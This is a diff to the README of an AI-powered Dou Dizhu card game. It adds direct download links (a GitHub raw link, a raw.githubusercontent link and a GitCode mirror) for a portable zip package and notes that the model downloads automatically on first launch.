@@ -31,7 +31,11 @@
 | 5 | 一键启动脚本 `启动游戏.bat` | 检测模型 → 拉起推理服务 → 拉起游戏 → 开浏览器，全链路自动 | 用户双击 |
 | 6 | Token 钱包与积分存档 | `wallet.json` 自动创建/读写/持久化 | 首局自动 |
 
-> 💡 想直接玩？下载仓库中 `dist/欢乐斗地主AI版_免安装整合包.zip`，解压后双击「启动游戏.bat」即可（模型会在首次启动时自动下载）。
+> 💡 **想直接玩？点击下方链接下载整合包，解压后双击「启动游戏.bat」即可**（模型会在首次启动时自动从魔搭下载，约 2.3 GB，支持断点续传）：
+>
+> **[⬇ 一键下载整合包（约 50 MB）](https://github.com/mw2wbyys6t-sudo/doudizhu-ai/raw/main/dist/欢乐斗地主AI版_免安装整合包.zip)**
+>
+> 下载备用：[raw 直链](https://raw.githubusercontent.com/mw2wbyys6t-sudo/doudizhu-ai/main/dist/欢乐斗地主AI版_免安装整合包.zip) ｜ [GitCode 镜像仓库](https://gitcode.com/gcw_VNt8FmMN/121)
 
 ## 调用了哪些 Skill（AI 开发过程说明）
 
